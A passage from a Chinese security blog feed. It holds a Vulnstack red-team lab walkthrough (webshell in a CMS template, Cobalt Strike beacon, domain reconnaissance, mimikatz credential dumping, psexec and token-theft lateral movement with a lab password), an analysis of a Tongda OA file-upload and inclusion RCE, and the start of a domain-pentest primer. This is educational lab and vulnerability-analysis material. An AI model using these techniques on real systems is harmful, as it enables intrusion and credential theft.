，不过我们不用工具，也容易找到前台模板的管理页面存在编辑功能，明显的写shell的地方。</p><p>比如随便找一个模板进行修改，插入一句话木马（虽然是随便找的，但是需要知道，这个模板在哪个网页执行）</p><img src="http://image.v0w.top/Blog/20200719173829.png" style="zoom:80%;" /><p>这个很明显就在<code>index.php</code>处的搜索功能。</p><p>比如我们随便搜索一个关键词，就会触发这个shell。再或者通过下载下来的备份文件搜索这个文件，直接访问到这个文件的路径也可以拿下shell。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.237.136&#x2F;yxcms&#x2F;index.php?r&#x3D;default%2Findex%2Fsearch&amp;keywords&#x3D;q&amp;type&#x3D;all</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.237.136&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;index_search.php</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719175223.png" style="zoom: 50%;" /><h1 id="0x04-内网渗透"><a href="#0x04-内网渗透" class="headerlink" title="0x04 内网渗透"></a>0x04 内网渗透</h1><h2 id="4-1-将web服务器上线到CS"><a href="#4-1-将web服务器上线到CS" class="headerlink" title="4.1 将web服务器上线到CS"></a>4.1 将web服务器上线到CS</h2><p>将刚才生成的<code>beacon.exe</code>上传到web目录，然后在shell中执行这个exe,就可以将shell上线到CS了。</p><img src="http://image.v0w.top/Blog/20200719192123.png" style="zoom:50%;" /><img src="http://image.v0w.top/Blog/20200719193327.png" style="zoom:50%;" /><h2 id="4-2-目标主机信息收集"><a href="#4-2-目标主机信息收集" class="headerlink" title="4.2 目标主机信息收集"></a>4.2 目标主机信息收集</h2><p>拿到 <code>shell</code> 第一步，调低心跳值，默认心跳为 <code>60s</code>，执行命令的响应很慢</p><p>我这是自己的内网且没有杀软我就设置为 0 了，真实环境不要设置这么低</p><p>进入 <code>beacon</code> 执行 <code>sleep 0</code>，然后查看下基本的本机信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">hostname</span><br><span class="line">net user</span><br><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719194054.png" style="zoom:80%;" /><p><code>systeminfo</code> 可以查看系统详细信息，提供两个小 <code>tips</code>:</p><p>查看是什么操作系统 &amp; 系统版本：<br>系统中文：<code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code><br>系统英文：<code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code><br>查询系统体系架构：echo % PROCESSOR_ARCHITECTURE%</p><img src="http://image.v0w.top/Blog/20200719195546.png" style="zoom:80%;" /><p>查询已安装的软件及版本信息：<code>wmic product get name,version</code></p><img src="http://image.v0w.top/Blog/20200719195654.png" style="zoom:80%;" /><p>在 <code>win10</code> 中，输入 <code>wmic /?</code> 会提示 <code>wmic</code> 已弃用，但在 <code>server2012R2</code>，<code>win7</code> 等版本中可以正常使用</p><p><code>powershell</code> 中可替代该命令的是 <code>Get-WmiObject</code>:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -class win32_product | Select-Object -property name,version</span><br></pre></td></tr></table></figure><p>查询进程及服务：<br><code>tasklist</code>，默认显示映像名称，PID，会话名，会话，内存使用</p><img src="http://image.v0w.top/Blog/20200719195906.png" style="zoom:80%;" /><p><code>tasklist /svc</code>，默认显示映像名称，PID，服务</p><img src="http://image.v0w.top/Blog/20200719195927.png" style="zoom:80%;" /><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719200121.png" style="zoom:80%;" /><p>常见的杀软进程：</p><table><thead><tr><th>进程名</th><th>软件</th></tr></thead><tbody><tr><td>360sd.exe</td><td>360 杀毒</td></tr><tr><td>360tray.exe</td><td>360 实时保护</td></tr><tr><td>ZhuDongFangYu.exe</td><td>360 主动防御</td></tr><tr><td>KSafeTray.exe</td><td>金山卫士</td></tr><tr><td>SafeDogUpdateCenter.exe</td><td>安全狗</td></tr><tr><td>McAfee</td><td>McShield.exe</td></tr><tr><td>egui.exe</td><td>NOD32</td></tr><tr><td>AVP.exe</td><td>卡巴斯基</td></tr><tr><td>avguard.exe</td><td>小红伞</td></tr><tr><td>bdagent.exe</td><td>BitDefender</td></tr></tbody></table><h2 id="4-3-域信息收集"><a href="#4-3-域信息收集" class="headerlink" title="4.3 域信息收集"></a>4.3 域信息收集</h2><h3 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h3><p>参考文章：<a href="https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw">内网渗透学习导航</a></p><blockquote><p>域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行。 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。 从 Windows Server 2003 开始 ， Active Directory 是负责维护该中央数据库的 Windows 组件。Windows 域的概念与工作组的概念形成对比，在该工作组中，每台计算机都维护自己的安全主体数据库。</p></blockquote><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>使用 <code>ipconfig /all</code> 查看 <code>DNS</code> 服务器：</p><p><img src="http://image.v0w.top/Blog/20200719200858.png"></p><p>发现 DNS 服务器名为 <code>god.org</code>，查看域信息：<code>net view</code></p><img src="http://image.v0w.top/Blog/20200719201026.png" style="zoom:80%;" /><p>查看主域信息：<code>net view /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719201134.png"></p><p>查看时间服务器：<code>net time /domain</code></p><img src="http://image.v0w.top/Blog/20200719201254.png"  /><p>发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但该用户不是域用户)</p><p>查询当前的登录域与用户信息：<code>net config workstation</code></p><p><img src="http://image.v0w.top/Blog/20200719201432.png"></p><h3 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h3><p>利用 <code>nslookup</code> 命令直接解析域名服务器：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell nslookup god.org# nslookup 域名</span><br></pre></td></tr></table></figure><h3 id="查询域控和用户信息"><a href="#查询域控和用户信息" class="headerlink" title="查询域控和用户信息"></a>查询域控和用户信息</h3><p>查看当前域的所有用户：<code>net user /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202425.png"></p><p>获取域内用户的详细信息：<code>wmic useraccount get /all</code></p><p>可以获取到用户名，描述信息，SID 域名等：</p><img src="http://image.v0w.top/Blog/20200719202526.png" style="zoom:80%;" /><p>查看所有域成员计算机列表：<code>net group &quot;domain computers&quot; /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202617.png"></p><p>查看域管理员：<code>net group &quot;domain admins&quot; /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202708.png"></p><p>获取域密码信息：<code>net accounts /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202902.png"></p><p>获取域信任信息 (cs 里执行提示不是内部或外部命令)：<code>nltest /domain_trusts</code></p><p>以下为win7中的执行结果：</p><p><img src="http://image.v0w.top/Blog/20200719203041.png"></p><h2 id="4-4-横向探测"><a href="#4-4-横向探测" class="headerlink" title="4.4 横向探测"></a>4.4 横向探测</h2><p>获取到一个 <code>cs</code> 的 <code>beacon</code> 后可以继续查看目标内网情况和端口开放情况</p><p>在 <code>beacon</code> 上右键 -&gt; 目标 -&gt; 选择 <code>net view</code> 或者 <code>port scan（端口扫描）</code>:</p><p><strong>net view</strong></p><img src="http://image.v0w.top/Blog/20200719203320.png" style="zoom:80%;" /><p>执行之后，可以在<code>CobaltStrike-&gt;可视化-&gt;目标列表</code>看到扫描出来的主机：</p><p><img src="http://image.v0w.top/Blog/20200719203856.png"></p><p>用 <code>cs</code> 的 <code>hashdump</code> 读内存密码：<code>hashdump</code>，</p><p>用 <code>mimikatz</code> 读注册表密码：<code>logonpasswords</code></p><img src="http://image.v0w.top/Blog/20200719204025.png" style="zoom:80%;" /><p>在凭证信息一栏可以清楚查看：</p><img src="http://image.v0w.top/Blog/20200719204108.png" style="zoom: 80%;" /><p>如果权限不够可以提权，自带部分提权POC</p><p><img src="http://image.v0w.top/Blog/20200719205029.png"></p><p><img src="http://image.v0w.top/Blog/20200719205118.png"></p><p>额外的提权插件：<a href="https://github.com/rsmudge/ElevateKit">ElevateKit</a>额外增加 <code>ms14-058</code>、<code>ms15-051</code>、<code>ms16-016</code>、<code>uac-schtasks</code> 四种提权方式</p><p>抓取密码后可以先探测内网其他主机：</p><p><code>ping</code> 方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL&#x3D;&quot;</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/20200719211417.png"></p><p>最简单的直接 <code>arp -a</code> 查看也可以，这里还推荐一个好用工具 <code>Ladon</code></p><p><a href="https://github.com/k8gege/Ladon"><strong>Ladon</strong></a>作者是 <code>k8gege</code>，它是一个大型内网渗透扫描器并且支持 <code>cs</code> 脚本形式</p><p><code>cs</code> 要使用的话只需要下载其中的 <code>Ladon.exe</code> 和 <code>Ladon.cna</code> 即可运行基本功能</p><p>详细功能参考官方 <a href="https://github.com/k8gege/Ladon/wiki"><code>wiki</code></a>或<a href="http://k8gege.org/p/648af4b3.html">官方说明文档</a></p><p>将Lodan下载下来后，在客户端的CS中<code>CobaltStrike-&gt;脚本管理器-&gt;Load-&gt;Lodan.cna</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;k8gege&#x2F;Ladon.git</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/20200719212518.png"></p><p>之后就可以愉快的使用了。</p><p>查看帮助：</p><img src="http://image.v0w.top/Blog/20200719212548.png" style="zoom: 80%;" /><p>扫描网段内存活主机信息：<code>Ladon 192.168.72.0/24 OsScan</code></p><p>域探测差不多了还可以使用 <a href="https://github.com/BloodHoundAD/BloodHound"><code>BloodHound</code></a>这款域渗透分析工具来分析攻击路径</p><p>BloodHound 介绍：</p><blockquote><p>BloodHound 是一种单页的 JavaScript 的 Web 应用程序，构建在 Linkurious 上，用 Electron 编译，NEO4J 数据库 PowerShell/C# ingestor.BloodHound 使用可视化图来显示 Active Directory 环境中隐藏的和相关联的主机内容。攻击者可以使用 BloodHound 轻松识别高度复杂的攻击路径，否则很难快速识别。防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入了解 Active Directory 环境中的权限关系。</p></blockquote><h2 id="4-5-横向移动"><a href="#4-5-横向移动" class="headerlink" title="4.5 横向移动"></a>4.5 横向移动</h2><p>因为192.168.52.0/24段不能直接连接到192.168.237.137(kali地址)，所以需要CS派生smb beacon。让内网的主机连接到win7上。</p><blockquote><p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。</p></blockquote><p>简单来说，SMB Beacon 有两种方式</p><p><strong>第一种直接派生一个孩子，目的为了进一步盗取内网主机的 hash</strong></p><p>新建一个 <code>Listener</code>，<code>payload</code> 设置为 <code>Beacon SMB</code>：</p><p><img src="http://image.v0w.top/Blog/20200719221248.png"></p><p>在已有的 <code>Beacon上</code>右键 <code>Spawn</code>(生成会话 / 派生)，选择创建的 <code>smb beacon</code> 的 <code>listerner</code>:</p><img src="http://image.v0w.top/Blog/20200719220636.png" style="zoom: 80%;" /><p>选择后会反弹一个子会话，在 <code>external</code> 的 <code>ip</code> 后面会有一个链接的小图标：</p><img src="http://image.v0w.top/Blog/20200719220734.png" style="zoom:80%;" /><p><img src="http://image.v0w.top/Blog/20200719220810.png"></p><p>这就是派生的 <code>SMB Beacon</code>，当前没有连接</p><p>可以在主 <code>Beacon</code> 上用 <code>link host</code> 连接它，或者 unlink host 断开它</p><p><img src="http://image.v0w.top/Blog/20200719221018.png"></p><p><strong>第二种在已有的 beacon 上创建监听，用来作为跳板进行内网穿透</strong></p><p>前提是能够通过 shell 之类访问到内网其他主机</p><h3 id="psexec-使用凭证登录其他主机"><a href="#psexec-使用凭证登录其他主机" class="headerlink" title="psexec 使用凭证登录其他主机"></a>psexec 使用凭证登录其他主机</h3><p>前面横向探测已经获取到内网内的其他 <code>Targets</code> 以及读取到的凭证信息</p><p>于是可以尝试使用 <code>psexec</code> 模块登录其他主机</p><p>右键选择一台非域控主机 <code>ROOT-TVI862UBEH</code> 的 <code>psexec</code> 模块：</p><img src="http://image.v0w.top/Blog/20200719223832.png" style="zoom: 67%;" /><p>在弹出的窗口中选择使用 <code>god.org</code> 的 <code>Administrator</code> 的凭证信息</p><p>监听器选择刚才创建的 <code>smb beacon</code>，会话也选择对应的 <code>smb beacon</code> 的会话：</p><p><img src="http://image.v0w.top/Blog/20200719224006.png"></p><img src="http://image.v0w.top/Blog/20200719224034.png" style="zoom:67%;" /><p>可以看到分别执行了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">[*] Tasked beacon to revert token</span><br><span class="line">beacon&gt; make_token GOD.ORG\Administrator V0Wldl19980114</span><br><span class="line">[*] Tasked beacon to create a token for GOD.ORG\Administrator</span><br><span class="line">beacon&gt; jump psexec ROOT-TVI862UBEH smb</span><br></pre></td></tr></table></figure><p>这几条命令，执行后得到了 <code>ROOT-TVI862UBEH</code> 这台主机的 <code>beacon</code></p><p>如法炮制得到了域控主机 <code>OWA</code> 的 <code>beacon</code>，最终目标视图如下：</p><p><img src="http://image.v0w.top/Blog/20200719224514.png"></p><h3 id="token-窃取"><a href="#token-窃取" class="headerlink" title="token 窃取"></a>token 窃取</h3><p>除了直接使用获取到的 <code>hash</code> 值，也可以直接窃取 <code>GOD\Administrator</code> 的 <code>token</code> 来登录其他主机</p><p>选择 <code>beacon</code> 右键 -&gt; 目标 -&gt; 进程列表</p><p>选择 <code>GOD\Administrator</code> 的 <code>token</code> 盗取：</p><img src="http://image.v0w.top/Blog/20200719225201.png" style="zoom: 67%;" /><p>然后在选择令牌处勾选使用当前 <code>token</code> 即可：</p><p><img src="http://image.v0w.top/Blog/20200719225303.png"></p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>我们利用mysql日志写shell或者CMS的模板文件写shell轻松拿下Web服务器，再利用Web服务器作为跳板，去横向收集域内主机信息，并利用窃取的凭证横向移动到其他主机，最终实现整个域的控制。</p><h1 id="0xFF-后记与参考链接"><a href="#0xFF-后记与参考链接" class="headerlink" title="0xFF 后记与参考链接"></a>0xFF 后记与参考链接</h1><p>内网渗透的内容很多，完成这个靶机，也只是管中窥豹，发现需要更多的积累和学习，也很感谢很多师傅的博客和笔记，使得我在练习这个靶机的时候轻松很多（<del>其实也没有，依然很累==</del>）0rz。后面希望能够继续更新这个系列，在内网渗透方面也能不断学习，不断成长。</p><p>参考链接：</p><ul><li><a href="https://www.freebuf.com/column/231111.html">红日官方WP-ATT&amp;CK实战 | Vulnstack 红队（一）</a></li><li><a href="https://soapffz.com/sec/558.html">soapffz师傅非常详细的ATT&amp;CK 实战 - 红日安全 vulnstack (一)</a></li><li><a href="https://blog.csdn.net/qq_36119192/article/details/103528138">内网渗透实战技巧</a></li><li><a href="https://mp.weixin.qq.com/s/rTfizm_b_c3NRS-37n3zsA">由浅入深的域渗透系列一（上）</a></li><li><a href="https://mp.weixin.qq.com/s/11ImZTDTPAF19moSTynBOA">由浅入深的域渗透系列一（下）</a></li><li><a href="https://www.c0bra.xyz/2019/12/14/Cobalt-Strike%E7%B3%BB%E5%88%979/">Cobalt Strike 系列 9</a></li><li>[第三节 SMB Beacon.md](<a href="https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E4%B8%89%E8%8A%82[SMB">https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/第三节[SMB</a> Beacon].md)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今后，尽量每周抽时间对较为完整的一个渗透靶机进行练习，先从红日安全团队分享的靶机实战环境开始吧。感谢</summary>
      
    
    
    
    <category term="靶场练习" scheme="v0w.top/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
    
    <category term="代码审计" scheme="v0w.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="域渗透" scheme="v0w.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="SQL注入" scheme="v0w.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="webshell" scheme="v0w.top/tags/webshell/"/>
    
    <category term="内网渗透" scheme="v0w.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意文件上传并利用文件包含导致RCE分析</title>
    <link href="v0w.top/2020/03/20/TODA-FileUpload-Inclusion-vuln/"/>
    <id>v0w.top/2020/03/20/TODA-FileUpload-Inclusion-vuln/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-07-18T10:39:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。</p><p>3月13日，通达OA在官方论坛发布通告称，近日接到用户反馈遭到勒索病毒攻击，提示用户注意安全风险，并且于同一天对所有版本发布了<a href="https://www.tongda2000.com/news/673.php">加固补丁</a>。</p><p>通过在v11.3版本的测试发现全版本的任意文件上传漏洞结合v11版本的文件包含漏洞可以造成远程命令执行，默认为System权限，恶意攻击者可以成功上传Webshell后门，并进一步释放勒索病毒，危害较大。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="php解密"><a href="#php解密" class="headerlink" title="php解密"></a>php解密</h2><p>环境搭建什么的就不说了，这里采用的是<a href="https://pan.baidu.com/s/127voqNZZJX5NkmuC4Ogfhg">2017的版本</a>，修复前的版本。</p><p><a href="https://www.tongda2000.com/download/2019.php">官网下载</a></p><p>相比于一般的php审计，该项目增加了php的加密。这里因为我也是第一次接触到php加密的文件审计，前期碰壁很多，尝试google了<code>php解密</code>，找到一些工具(如黑刀zend等)，但是并没有用（可能是zend版本的问题，也可能是工具本身的问题，没有深究）</p><p>后来看到一篇关于该漏洞的复现——<a href="https://www.cnblogs.com/potatsoSec/p/12516234.html">通达OA最新RCE漏洞分析</a>，并询问potatso大佬解密方法后，得到耐心解答0rz，并找到一个在线进行php解密的网站——<a href="http://dezend.qiling.org/free.html">DEPHP解密</a></p><p>另外是一个批量解密的工具，seay神写的<a href="http://www.pc6.com/softview/SoftView_610659.html">SeayDzend</a></p><p>另外了解了关于php加密混淆的几种方法——<a href="https://cloud.tencent.com/developer/article/1152056">PHP加密解密的解析</a></p><p>通达OA php代码部分的加密统统采用的是Zend加密。</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><code>/webroot/ispirit/im/upload.php</code></p><p>这是一个文件上传的功能点，在未修复版本中，是可以绕过验证，从而达到任意上传的效果。有一个if判断如果<code>$P</code>存在且非空就不需要经过<code>auth.php</code>验证即可执行后续代码。利用此处逻辑漏洞可绕过登陆验证直接上传文件。补丁文件中是直接强制<code>include_once ‘./auth.php’;</code> 进行登录验证。因上传后的文件不在根目录，所以无法直接利用，因此需要进行文件包含。</p><p><img src="https://i.loli.net/2020/03/24/pg6nPi7X5yu8ewD.png"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>未修复前，可通过精心构造json进入47行的<code>includ_once</code>进行文件包含。官方在补丁中增加了对”..”的过滤防止用户读取其他目录文件。</p><p><img src="https://i.loli.net/2020/03/26/XukdcjaQRpyoVWt.png" alt="20200326222917.png"></p><h2 id="分析利用链"><a href="#分析利用链" class="headerlink" title="分析利用链"></a>分析利用链</h2><ol><li><p>先判断<code>$P</code>参数是否调用了Session和auth登陆认证，当<code>$P</code>费控时，此处可以绕过<code>auth.php</code>登陆验证</p></li><li><p>判断<code>DEST_UID</code>是否为空，如果<code>$DEST_UID</code>存在<code>,</code>则通过<code>intval</code>获取整数值，<code>$DEST_UID==0</code>且<code>UPLOAD_MODE==2</code>才接受，否则 ID无效。</p></li><li><p><code>$_FILES</code>全局变量大于等于1的时候(就是有文件上传的时候)，会调用upload方法进行处理，这里的文件上传的参数为<code>ATTACHMENT</code></p><p><img src="https://i.loli.net/2020/03/26/gRaE2myBU39GxcW.png" alt="20200326204612.png"></p></li><li><p>跟进发现调用的是<code>\general\appbuilder\modules\appdesign\models\AppUtils.php</code>中用yii框架的upload 函数，找了一下，对后缀名有限制。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">UploadedFile</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadForm</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> UploadedFile</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> $imageFile;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            [[<span class="string">&#x27;imageFile&#x27;</span>], <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;skipOnEmpty&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;extensions&#x27;</span> =&gt; <span class="string">&#x27;png, jpg&#x27;</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;validate()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;imageFile-&gt;saveAs(<span class="string">&#x27;uploads/&#x27;</span> . <span class="keyword">$this</span>-&gt;imageFile-&gt;baseName . <span class="string">&#x27;.&#x27;</span> . <span class="keyword">$this</span>-&gt;imageFile-&gt;extension);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>那么就可以在url中传入<code>../</code> 进行跨目录，从而可以包含第1个漏洞上传的php文件，造成RCE。</p></li></ol><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>*本次复现以通达OAv11.3 版本 为例<br><img src="https://image.3001.net/images/20200319/1584586276_5e72de24f33c1.png!small"></p><p>第1个漏洞的Poc的构造需要满足四个条件: P非空、DEST_UID非空且为数字、UPLOAD_MODE为1或2或3、ATTACHMENT的filename后缀名不能为<code>php</code>最后构造的Payload如下<br><img src="https://image.3001.net/images/20200319/1584585871_5e72dc8f606a3.png!small"><br>上传了1个文件名为<code>a.phtml</code>的php文件 绕过黑名单检测路径为 attach/im/2003/72566742.a.phtm 但该目录不在webroot下不能直接执行webshell，才需要利用后面的文件包含漏洞跨目录解析</p><p><img src="https://image.3001.net/images/20200319/1584585872_5e72dc902ceb5.png!small"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>打上官方发布的补丁：<a href="https://www.tongda2000.com/news/673.php">加固补丁</a>。</p><h1 id="个人观点"><a href="#个人观点" class="headerlink" title="个人观点"></a>个人观点</h1><p>虽然我很菜，但是我个人不喜欢这个官网上的一些内容，主要是想要表现产品的优秀，将顾客的信息公之于众。在其官网上，可以非常容易的找到有哪些企业使用了这个系统。这的确是长了脸面（我们产品很好），但是<strong>没有一个系统是绝对安全的</strong>，这种做法也给这个用户带来的风险, 在黑客进行攻击的时候，这种行为无疑是给攻击者们提供了便利，这大概也是这个勒索病毒横行的原因之一吧。</p><p><img src="https://i.loli.net/2020/03/24/vzEGixBJK2Fbqke.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.cnblogs.com/potatsoSec/p/12516234.html">通达OA最新RCE漏洞分析</a> potatso 博客园</li><li><a href="https://cloud.tencent.com/developer/article/1152056">PHP加密解密的解析</a></li><li><a href="http://dezend.qiling.org/free.html">DEPHP解密</a></li><li><a href="https://www.freebuf.com/column/230871.html">通达OA任意文件上传和文件包含漏洞导致RCE详细代码审计分析及Poc构造复现</a> freebuf</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结</summary>
      
    
    
    
    <category term="漏洞复现" scheme="v0w.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="php" scheme="v0w.top/tags/php/"/>
    
    <category term="代码审计" scheme="v0w.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="文件上传" scheme="v0w.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="文件包含" scheme="v0w.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>域渗透入门（一）</title>
    <link href="v0w.top/2020/03/15/DomainPentest1/"/>
    <id>v0w.top/2020/03/15/DomainPentest1/</id>
    <published>2020-03-14T16:00:00.000Z</published>
    <updated>2020-07-18T10:15:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近找工作，发现光打CTF不足以应对企业的需求，很多都会问一些内网渗透方面的知识。而我之前内网渗透这一块一直没怎么涉及，虽然有点晚的，但是确实需要补一补，认真学习内网渗透。另外后面打算做成一个系列，内网渗透的入门到实战之类的。</p><h1 id="渗透常见概念"><a href="#渗透常见概念" class="headerlink" title="渗透常见概念"></a>渗透常见概念</h1><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><blockquote><p>​    局域网（Local Area Network, LAN），又称内网。内网的计算机以NAT（网络地址转换）协议，通过一个公共的网关访问Internet。内网的计算机可向Internet上的其他计算机发送连接请求，但Internet上其他的计算机无法向内网的计算机发送连接请求。</p></blockquote><h2 id="域和域控制器"><a href="#域和域控制器" class="headerlink" title="域和域控制器"></a>域和域控制器</h2><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><blockquote><p>​    域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系（即Trust Relation）。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p></blockquote><blockquote><p>​    域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域；每个域都有自己的安全策略，以及它与其他域的安全信任关系。</p></blockquote><blockquote><p>​    域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</p></blockquote><h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><blockquote><p>​    不过在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。</p></blockquote><blockquote><p>​    